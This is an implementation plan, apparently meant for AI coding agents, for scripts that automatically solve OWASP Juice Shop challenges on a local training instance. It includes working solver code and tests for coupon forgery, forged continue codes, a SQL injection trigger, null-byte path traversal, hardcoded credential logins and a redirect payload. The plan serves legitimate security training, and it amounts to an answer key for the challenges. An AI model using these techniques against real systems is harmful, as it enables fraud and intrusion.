# Juice Shop Automator — Phase 4 (Cryptographic Issues + Security Misconfiguration + Observability Failures + Miscellaneous) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Extend the existing Juice Shop automator (framework + 75 challenges already
merged from Phases 1–3) to solve Cryptographic Issues (5 of 5), Security
Misconfiguration (4 of 4), Observability Failures (4 of 4), and Miscellaneous (5 of
6 — `web3WalletChallenge` deferred, see below) — 18 of the 19 challenges originally
planned for Phase 4.

**Architecture:** Same as Phases 1–3 — new solver modules registered via
`solvers.base.register`, consuming `core.client.JuiceShopClient` /
`solvers.base.SolverContext`, executed by the existing `core.runner.run_all` and
verified against the live `/api/Challenges/` endpoint. No framework changes needed.

**Tech Stack:** Python 3.11+, `requests` (existing), `python-socketio[client]`
(existing, from Phase 1 — reused for two new WebSocket-driven solvers),
`hashids>=1.3` (new — cross-language-compatible with the JS `hashids` package
Juice Shop itself uses for continue codes). No new dependency for the Z85 coupon
forgery — it's a ~15-line algorithm hand-ported directly from the exact npm
package Juice Shop depends on (`z85@0.0.2`), safer than trusting a same-named but
possibly-incompatible PyPI package (none exists under the name `z85` anyway).

## Global Constraints

- Target instance: `http://localhost:3000`, started via `npm start`, never Docker.
- No mocking. A solver is only considered done when `runner.py` observes
  `solved: true` for its key from the live `/api/Challenges/` endpoint.
- Every solver is isolated: an exception in one must not stop the others (already
  guaranteed by `core.runner.run_all`).
- Email domain for all seeded accounts is `juice-sh.op`.
- **Known deviation from the original design spec:** `web3WalletChallenge`
  ("Wallet Depletion") requires a real on-chain Ethereum Sepolia-testnet
  transaction, detected server-side via a WebSocket listener connected to
  `wss://eth-sepolia.g.alchemy.com/v2/${ALCHEMY_API_KEY}` (`routes/web3Wallet.ts`)
  — the exact same dependency pattern as `nftMintChallenge`, deferred in Phase 3.
  The server logs "will not work as intended without a valid ALCHEMY_API_KEY" for
  this exact challenge at startup. No local/offline path exists. Deferred, same
  treatment as the other API-key/LLM-dependent challenges. Phase 4 therefore
  delivers 18, not 19.
- **Running-total correction:** Phase 3's completion commit message stated
  "75/129 overall" — that arithmetic was wrong (it should have been 75/108: the
  original 110-challenge target minus `aiDebuggingChallenge` (Phase 2) minus
  `nftMintChallenge` (Phase 3) = 108). The commit history isn't being rewritten
  over a comment-only mistake, but this plan uses the corrected baseline: 108
  achievable before this phase, minus `web3WalletChallenge` (-1) = **107 total
  achievable across all 5 phases**, of which this phase delivers 18 (75 + 18 =
  93 after this phase).
- Verified directly against the Juice Shop 2026 `master` source
  (`routes/easterEgg.ts`, `routes/fileServer.ts`, `routes/fileUpload.ts`,
  `routes/login.ts`, `routes/metrics.ts`, `routes/order.ts`,
  `routes/premiumReward.ts`, `routes/restoreProgress.ts`, `routes/verify.ts`,
  `routes/coupon.ts`, `routes/logfileServer.ts`,
  `lib/startup/registerWebsocketEvents.ts`, `lib/insecurity.ts`, `lib/utils.ts`,
  `server.ts`, `config/default.yml`, and the actual `z85@0.0.2` npm package
  source fetched from the registry) on 2026-08-09 — endpoints, field names, and
  the Z85/Hashids encoding schemes are taken directly from that source, not
  guessed.

---

### Task 1: Cryptographic Issues solvers (5 of 5)

**Files:**
- Create: `solvers/cryptographic_issues.py`
- Test: `tests/test_cryptographic_issues_live.py`
- Modify: `requirements.txt` (add `hashids>=1.3`)

**Interfaces:**
- Consumes `solvers.base.register`, `SolverContext`, `JuiceShopClient` from the
  existing framework.
- Produces 5 registered solvers under category `"Cryptographic Issues"`.

- [ ] **Step 1: Add the new dependency**

```
# requirements.txt — append this line
hashids>=1.3
```

- [ ] **Step 2: Write `solvers/cryptographic_issues.py`**

```python
"""Cryptographic Issues category solvers (5 of 5). Verified against
routes/order.ts, routes/coupon.ts, routes/restoreProgress.ts,
routes/premiumReward.ts, routes/easterEgg.ts, routes/verify.ts,
lib/insecurity.ts, and lib/utils.ts (fetched 2026-08-09)."""
import datetime
import uuid

from hashids import Hashids

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"

# --- lib/insecurity.ts's generateCoupon()/discountFromCoupon() encode/decode
# coupons as Z85 (ZeroMQ RFC 32) over the string "<MMMYY>-<discount>". The
# real npm package this app depends on (z85@0.0.2) requires the raw byte
# length to be an exact multiple of 4 (encode() returns null otherwise) —
# this is why a 2-digit discount (e.g. 80) is used, not 3-digit "100": with
# the "AUG26-" prefix (6 chars), only a 2-digit discount makes the total
# length divisible by 4. Hand-ported directly from that package's source
# (fetched from the npm registry) rather than trusting an unrelated PyPI
# package that happens to share the name. ---

_Z85_ENCODER = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"


def _z85_encode(data: bytes) -> str:
    if len(data) % 4 != 0:
        raise ValueError("z85 payload length must be a multiple of 4")
    out = []
    value = 0
    for i, b in enumerate(data, start=1):
        value = value * 256 + b
        if i % 4 == 0:
            divisor = 85 * 85 * 85 * 85
            while divisor >= 1:
                out.append(_Z85_ENCODER[(value // divisor) % 85])
                divisor //= 85
            value = 0
    return "".join(out)


def _current_mmmyy() -> str:
    months = ["JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "OCT", "NOV", "DEC"]
    now = datetime.datetime.now()
    return months[now.month - 1] + f"{now.year % 100:02d}"


@register("forgedCouponChallenge", "Cryptographic Issues", 6)
def solve_forged_coupon(ctx: SolverContext) -> None:
    email = f"forgedcoupon.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    login_resp = ctx.client.login(email, "Test1234!")
    bid = login_resp.json()["authentication"]["bid"]
    coupon = _z85_encode(f"{_current_mmmyy()}-80".encode())
    apply_resp = ctx.client.put(f"/rest/basket/{bid}/coupon/{coupon}")
    apply_resp.raise_for_status()
    products = ctx.client.get("/rest/products/search", params={"q": ""}).json()["data"]
    product_id = products[0]["id"]
    ctx.client.post("/api/BasketItems", json={"ProductId": product_id, "BasketId": bid, "quantity": 1}).raise_for_status()
    ctx.client.post(f"/rest/basket/{bid}/checkout").raise_for_status()


# --- routes/restoreProgress.ts: "continue codes" are Hashids-encoded
# challenge-id lists (Hashids is a well-known, cross-language-deterministic
# scheme — the Python `hashids` package produces byte-identical output to
# the JS `hashids/cjs` package given the same salt/minLength/alphabet).
# Encoding the fixed sentinel id 999 with the exact salt/alphabet this route
# uses and PUTting it to the apply endpoint solves the challenge directly,
# without needing to know any real challenge's numeric id. ---

@register("continueCodeChallenge", "Cryptographic Issues", 6)
def solve_continue_code(ctx: SolverContext) -> None:
    hashids = Hashids(
        salt="this is my salt",
        min_length=60,
        alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890",
    )
    code = hashids.encode(999)
    ctx.client.put(f"/rest/continue-code/apply/{code}").raise_for_status()


# --- routes/easterEgg.ts serveEasterEgg: solved unconditionally by
# requesting this exact (deliberately absurd, hand-typed-in-the-URL-bar
# style) path — no auth or payload needed. ---

@register("easterEggLevelTwoChallenge", "Cryptographic Issues", 4)
def solve_easter_egg_level_two(ctx: SolverContext) -> None:
    ctx.client.get("/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg").raise_for_status()


# --- routes/premiumReward.ts servePremiumContent: solved unconditionally by
# requesting this exact path (the joke being its own "exploit" — the URL
# text literally describes bypassing a paywall meant to require payment). ---

@register("premiumPaywallChallenge", "Cryptographic Issues", 6)
def solve_premium_paywall(ctx: SolverContext) -> None:
    ctx.client.get(
        "/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us"
    ).raise_for_status()


# --- routes/verify.ts databaseRelatedChallenges (mounted with app.use(),
# runs on every request): weirdCryptoChallenge solves when a single
# Feedback or Complaint message contains any one of a fixed set of
# "weird"/homebrew crypto scheme names — same
# checkPatternInFeedbackAndComplaints pattern as Phase 3's
# typosquatting/supplyChain/knownVulnerableComponent solvers. ---

@register("weirdCryptoChallenge", "Cryptographic Issues", 2)
def solve_weird_crypto(ctx: SolverContext) -> None:
    email = f"weirdcrypto.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/api/Complaints", json={"message": "This app rolls its own z85/base85 encoding for tokens, that's a weird crypto choice."}).raise_for_status()
```

- [ ] **Step 3: Write the live verification test**

```python
# tests/test_cryptographic_issues_live.py
"""No mocking, per project convention: runs the real solvers against a live
Juice Shop instance and checks the live score-board."""
import pytest

import solvers.cryptographic_issues  # noqa: F401 - registers the solvers
from core.client import JuiceShopClient
from core.runner import run_all


def _instance_reachable() -> bool:
    try:
        JuiceShopClient().get("/rest/admin/application-version", timeout=2).raise_for_status()
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _instance_reachable(), reason="Juice Shop not running on localhost:3000")

CRYPTOGRAPHIC_ISSUES_KEYS = [
    "forgedCouponChallenge", "continueCodeChallenge", "easterEggLevelTwoChallenge",
    "premiumPaywallChallenge", "weirdCryptoChallenge",
]


def test_all_cryptographic_issues_challenges_solved():
    results = run_all(categories=["Cryptographic Issues"])
    by_key = {r["key"]: r for r in results}
    failures = [k for k in CRYPTOGRAPHIC_ISSUES_KEYS if not by_key.get(k, {}).get("solved")]
    assert not failures, f"unsolved: {failures}; details={[by_key.get(k) for k in failures]}"
```

- [ ] **Step 4: Run the live test against the running instance**

```bash
pip install -r requirements.txt
pytest tests/test_cryptographic_issues_live.py -v
```

Expected: PASS. If `forgedCouponChallenge` fails with a 4xx on the coupon-apply
call, print the exact coupon string and re-derive `_current_mmmyy()` by hand
against `lib/utils.ts`'s `toMMMYY` — the month/year format (`MMMYY`, e.g.
`AUG26`) must match exactly, and the server's own clock (not the test runner's)
is authoritative if they ever drift. If `continueCodeChallenge` fails, verify the
Python `hashids` package version actually matches the JS Hashids v1/v2 wire
format by round-tripping `hashids.decode(hashids.encode(999)) == (999,)` locally
before assuming the server-side algorithm differs.

- [ ] **Step 5: Commit**

```bash
git add solvers/cryptographic_issues.py tests/test_cryptographic_issues_live.py requirements.txt
git commit -m "feat: solve 5 of 5 Cryptographic Issues challenges"
```

---

### Task 2: Security Misconfiguration (4) + Observability Failures (4) solvers

**Files:**
- Create: `solvers/security_misconfiguration.py`
- Create: `solvers/observability_failures.py`
- Test: `tests/test_security_misconfiguration_live.py`
- Test: `tests/test_observability_failures_live.py`

**Interfaces:**
- Consumes `solvers.base.register`, `SolverContext`, `JuiceShopClient` from the
  existing framework.
- Produces 4 registered solvers under category `"Security Misconfiguration"` and
  4 under category `"Observability Failures"`.

- [ ] **Step 1: Write `solvers/security_misconfiguration.py`**

```python
"""Security Misconfiguration category solvers (4 of 4). Verified against
routes/fileUpload.ts, routes/login.ts, routes/verify.ts,
lib/startup/registerWebsocketEvents.ts, lib/insecurity.ts, and server.ts
(fetched 2026-08-09)."""
import time

import socketio

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


# --- routes/fileUpload.ts handleXmlUpload/handleYamlUpload: both fire
# `challengeUtils.solveIf(deprecatedInterfaceChallenge, () => true)`
# unconditionally the moment a file ending in .xml, .yml, or .yaml is
# uploaded — no valid/parseable content required, the *interface itself*
# (accepting these formats at all) is what's "deprecated". ---

@register("deprecatedInterfaceChallenge", "Security Misconfiguration", 2)
def solve_deprecated_interface(ctx: SolverContext) -> None:
    ctx.client.post("/file-upload", files={"file": ("legacy.xml", b"<note>hi</note>", "application/xml")})


# --- routes/verify.ts errorHandlingChallenge (mounted globally as Express
# error-handling middleware, 4-arg signature — server.ts's
# `app.use(verify.errorHandlingChallenge())`): fires whenever ANY unhandled
# error reaches it with statusCode 200 or >401 — i.e. almost any genuine
# unhandled 500. Deliberately reusing the exact malformed UNION SELECT
# payload (missing the `))` needed to close routes/search.ts's doubled
# WHERE parens) that Phase 1 discovered breaks with a real SQLITE_ERROR,
# rather than crafting a new one — it's a reliable, known-bad trigger. ---

@register("errorHandlingChallenge", "Security Misconfiguration", 1)
def solve_error_handling(ctx: SolverContext) -> None:
    ctx.client.get("/rest/products/search", params={"q": "zzz' UNION SELECT invalid-- "})


# --- routes/login.ts verifyPreLoginChallenges: fires purely on request
# body match, regardless of whether the login itself succeeds. The support
# account's real password is a hardcoded literal in the source. ---

@register("loginSupportChallenge", "Security Misconfiguration", 6)
def solve_login_support(ctx: SolverContext) -> None:
    ctx.client.post("/rest/user/login", json={"email": f"support@{DOMAIN}", "password": "J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P"})


# --- lib/startup/registerWebsocketEvents.ts: solved by emitting a
# `verifySvgInjectionChallenge` Socket.IO event with a string matching the
# server's regex (a path-traversal-looking prefix into a `/redirect?to=`
# URL pointing at an allow-listed host) — `security.isRedirectAllowed()`
# passes automatically since the target text contains "cataas.com", which
# is on the app's redirect allowlist (the same host the regex itself
# requires). ---

SVG_INJECTION_PAYLOAD = "../../../redirect?to=https://cataas.com/cat"


@register("svgInjectionChallenge", "Security Misconfiguration", 5)
def solve_svg_injection(ctx: SolverContext) -> None:
    sio = socketio.SimpleClient()
    sio.connect(ctx.base_url, transports=["websocket"])
    try:
        sio.emit("verifySvgInjectionChallenge", SVG_INJECTION_PAYLOAD)
        time.sleep(1)
    finally:
        sio.disconnect()
```

- [ ] **Step 2: Write `solvers/observability_failures.py`**

```python
"""Observability Failures category solvers (4 of 4). Verified against
routes/fileServer.ts, routes/login.ts, routes/metrics.ts, server.ts, and
config/default.yml (fetched 2026-08-09)."""
from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


# --- server.ts: `/support/logs` is mounted with
# verify.accessControlChallenges(), which solves accessLogDisclosureChallenge
# the moment any request URL under that prefix matches /access\.log(0-9-)*/
# — the file doesn't need to actually exist on disk, the check runs before
# routes/logfileServer.ts even tries to read it. ---

@register("accessLogDisclosureChallenge", "Observability Failures", 4)
def solve_access_log_disclosure(ctx: SolverContext) -> None:
    ctx.client.get("/support/logs/access.log")


# --- routes/login.ts verifyPreLoginChallenges: same pre-login body-match
# pattern as loginSupportChallenge (Task 1's Security Misconfiguration
# solvers) — the "leaked" credential pair is a hardcoded literal. ---

@register("dlpPasswordSprayingChallenge", "Observability Failures", 5)
def solve_dlp_password_spraying(ctx: SolverContext) -> None:
    ctx.client.post("/rest/user/login", json={"email": f"J12934@{DOMAIN}", "password": "0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB"})


# --- routes/fileServer.ts verifySuccessfulPoisonNullByteExploit: same
# poison-null-byte technique used repeatedly in Phases 2-3, targeting the
# one remaining seeded file this specific challenge checks for. ---

@register("misplacedSignatureFileChallenge", "Observability Failures", 4)
def solve_misplaced_signature_file(ctx: SolverContext) -> None:
    ctx.client.get("/ftp/suspicious_errors.yml%2500.md")


# --- routes/metrics.ts serveMetrics: solved as long as the request's
# User-Agent header doesn't contain any of config.default.yml's
# metricsIgnoredUserAgents ("Prometheus", "Alloy", "promscrape") — the
# default `requests`/Python User-Agent never matches any of those, so no
# special header is needed. ---

@register("exposedMetricsChallenge", "Observability Failures", 1)
def solve_exposed_metrics(ctx: SolverContext) -> None:
    ctx.client.get("/metrics").raise_for_status()
```

**Note on `misplacedSignatureFileChallenge`'s payload encoding:** copy the
`%2500` from `forgottenDevBackupChallenge`/`forgottenBackupChallenge` in
`solvers/sensitive_data.py` (Phase 2) verbatim — it's the literal 3-character
text `%00`, double-percent-encoded so Express decodes it to that literal text
once before `cutOffPoisonNullByte` truncates on it.

**Note on `dlpPasswordSprayingChallenge`'s password string:** it contains a
non-ASCII `§` character (U+00A7) — written above as the `§` escape to
avoid any source-file encoding ambiguity. Copy it exactly; `requests`' JSON
body encoding handles the UTF-8 bytes correctly either way.

- [ ] **Step 3: Write the live verification tests**

```python
# tests/test_security_misconfiguration_live.py
import pytest

import solvers.security_misconfiguration  # noqa: F401
from core.client import JuiceShopClient
from core.runner import run_all


def _instance_reachable() -> bool:
    try:
        JuiceShopClient().get("/rest/admin/application-version", timeout=2).raise_for_status()
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _instance_reachable(), reason="Juice Shop not running on localhost:3000")

SECURITY_MISCONFIGURATION_KEYS = [
    "deprecatedInterfaceChallenge", "errorHandlingChallenge", "loginSupportChallenge", "svgInjectionChallenge",
]


def test_all_security_misconfiguration_challenges_solved():
    results = run_all(categories=["Security Misconfiguration"])
    by_key = {r["key"]: r for r in results}
    failures = [k for k in SECURITY_MISCONFIGURATION_KEYS if not by_key.get(k, {}).get("solved")]
    assert not failures, f"unsolved: {failures}; details={[by_key.get(k) for k in failures]}"
```

```python
# tests/test_observability_failures_live.py
import pytest

import solvers.observability_failures  # noqa: F401
from core.client import JuiceShopClient
from core.runner import run_all


def _instance_reachable() -> bool:
    try:
        JuiceShopClient().get("/rest/admin/application-version", timeout=2).raise_for_status()
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _instance_reachable(), reason="Juice Shop not running on localhost:3000")

OBSERVABILITY_FAILURES_KEYS = [
    "accessLogDisclosureChallenge", "dlpPasswordSprayingChallenge",
    "misplacedSignatureFileChallenge", "exposedMetricsChallenge",
]


def test_all_observability_failures_challenges_solved():
    results = run_all(categories=["Observability Failures"])
    by_key = {r["key"]: r for r in results}
    failures = [k for k in OBSERVABILITY_FAILURES_KEYS if not by_key.get(k, {}).get("solved")]
    assert not failures, f"unsolved: {failures}; details={[by_key.get(k) for k in failures]}"
```

- [ ] **Step 4: Run the live tests**

```bash
pytest tests/test_security_misconfiguration_live.py tests/test_observability_failures_live.py -v
```

Expected: PASS. If `svgInjectionChallenge` fails, this is the highest-risk solver
in this task — check the actual `python-socketio` `SimpleClient` API in the
installed version (`sio.sleep` may not exist on all versions; the code above
falls back to `time.sleep` if it doesn't, but confirm the emit actually reaches
the server before disconnecting by checking the Juice Shop server log for the
`verifySvgInjectionChallenge` event, or add a short unconditional sleep). If
`errorHandlingChallenge` doesn't flip after the search request, confirm the
response was genuinely a 500 (not a caught 400) by printing
`resp.status_code`/`resp.text`.

- [ ] **Step 5: Commit**

```bash
git add solvers/security_misconfiguration.py solvers/observability_failures.py tests/test_security_misconfiguration_live.py tests/test_observability_failures_live.py
git commit -m "feat: solve 4 of 4 Security Misconfiguration + 4 of 4 Observability Failures challenges"
```

---

### Task 3: Miscellaneous solvers (5 of 6 — web3WalletChallenge deferred) + full Phase 4 report run

**Files:**
- Create: `solvers/miscellaneous.py`
- Test: `tests/test_miscellaneous_live.py`
- Modify: `main.py` (register all three new modules from this phase)

**Interfaces:**
- Consumes `solvers.base.register`, `SolverContext`, `JuiceShopClient` from the
  existing framework.
- Produces 5 registered solvers under category `"Miscellaneous"`.

- [ ] **Step 1: Write `solvers/miscellaneous.py`**

```python
"""Miscellaneous category solvers (5 of 6 — web3WalletChallenge needs a real
funded Sepolia-testnet wallet + paid Alchemy API key, neither of which this
environment has, and is deferred). Verified against routes/verify.ts,
lib/startup/registerWebsocketEvents.ts, and config/default.yml (fetched
2026-08-09)."""
import time
import uuid

import socketio

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


# --- routes/verify.ts accessControlChallenges (mounted on
# /assets/public/images/padding and, for security.txt, directly on
# /.well-known/security.txt and /security.txt): same "no referer header"
# uiBypassed trick as Phase 2's web3SandboxChallenge/adminSectionChallenge —
# a plain HTTP client naturally satisfies it. ---

@register("scoreBoardChallenge", "Miscellaneous", 1)
def solve_score_board(ctx: SolverContext) -> None:
    ctx.client.get("/assets/public/images/padding/1px.png").raise_for_status()


@register("privacyPolicyChallenge", "Miscellaneous", 1)
def solve_privacy_policy(ctx: SolverContext) -> None:
    ctx.client.get("/assets/public/images/padding/81px.png").raise_for_status()


@register("securityPolicyChallenge", "Miscellaneous", 2)
def solve_security_policy(ctx: SolverContext) -> None:
    ctx.client.get("/security.txt").raise_for_status()


# --- lib/startup/registerWebsocketEvents.ts: solved by emitting a
# `verifyCloseNotificationsChallenge` Socket.IO event with any array of
# more than one element — simulating "dismiss all notifications at once". ---

@register("closeNotificationsChallenge", "Miscellaneous", 1)
def solve_close_notifications(ctx: SolverContext) -> None:
    sio = socketio.SimpleClient()
    sio.connect(ctx.base_url, transports=["websocket"])
    try:
        sio.emit("verifyCloseNotificationsChallenge", [1, 2])
        time.sleep(1)
    finally:
        sio.disconnect()


# --- routes/verify.ts databaseRelatedChallenges (csafChallenge()): solved
# when a single Feedback or Complaint message contains
# config.default.yml's csafHashValue substring — same
# checkPatternInFeedbackAndComplaints pattern as Task 1's
# weirdCryptoChallenge. ---

CSAF_HASH_VALUE = "7e7ce7c65db3bf0625fcea4573d25cff41f2f7e3474f2c74334b14fc65bb4fd26af802ad17a3a03bf0eee6827a00fb8f7905f338c31b5e6ea9cb31620242e843"


@register("csafChallenge", "Miscellaneous", 3)
def solve_csaf(ctx: SolverContext) -> None:
    email = f"csaf.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post(
        "/api/Complaints",
        json={"message": f"Advisory hash mismatch: {CSAF_HASH_VALUE}"},
    ).raise_for_status()
```

- [ ] **Step 2: Write the live verification test**

```python
# tests/test_miscellaneous_live.py
import pytest

import solvers.miscellaneous  # noqa: F401
from core.client import JuiceShopClient
from core.runner import run_all


def _instance_reachable() -> bool:
    try:
        JuiceShopClient().get("/rest/admin/application-version", timeout=2).raise_for_status()
        return True
    except Exception:
        return False


pytestmark = pytest.mark.skipif(not _instance_reachable(), reason="Juice Shop not running on localhost:3000")

MISCELLANEOUS_KEYS = [
    "scoreBoardChallenge", "privacyPolicyChallenge", "securityPolicyChallenge",
    "closeNotificationsChallenge", "csafChallenge",
]


def test_all_miscellaneous_challenges_solved():
    results = run_all(categories=["Miscellaneous"])
    by_key = {r["key"]: r for r in results}
    failures = [k for k in MISCELLANEOUS_KEYS if not by_key.get(k, {}).get("solved")]
    assert not failures, f"unsolved: {failures}; details={[by_key.get(k) for k in failures]}"
```

- [ ] **Step 3: Run the live test**

```bash
pytest tests/test_miscellaneous_live.py -v
```

Expected: PASS.

- [ ] **Step 4: Register all three new solver modules in `main.py`**

In `main.py`, alongside the existing `try: import solvers.X` blocks, add:

```python
try:
    import solvers.cryptographic_issues  # noqa: F401
except ImportError:
    pass
try:
    import solvers.security_misconfiguration  # noqa: F401
except ImportError:
    pass
try:
    import solvers.observability_failures  # noqa: F401
except ImportError:
    pass
try:
    import solvers.miscellaneous  # noqa: F401
except ImportError:
    pass
```

- [ ] **Step 5: Run the full Phase 1–4 slice against the running instance**

```bash
python main.py --category Injection --category XSS --category "Broken Authentication" --category "Sensitive Data Exposure" --category "Broken Access Control" --category "Improper Input Validation" --category "Vulnerable Components" --category "Cryptographic Issues" --category "Security Misconfiguration" --category "Observability Failures" --category Miscellaneous
```

Expected output: a report table with `TOTAL: 93/93 solved` (75 from Phases 1–3 +
18 from Phase 4). If any key is not solved, its `[FAIL]` line includes the
captured HTTP error — fix that specific solver function only, then rerun just
that category with `--category <name>`.

- [ ] **Step 6: Commit**

```bash
git add solvers/miscellaneous.py tests/test_miscellaneous_live.py main.py
git commit -m "chore: Phase 4 (Cryptographic Issues + Security Misconfiguration + Observability Failures + Miscellaneous) complete — 18/19 (93/107 overall)"
```
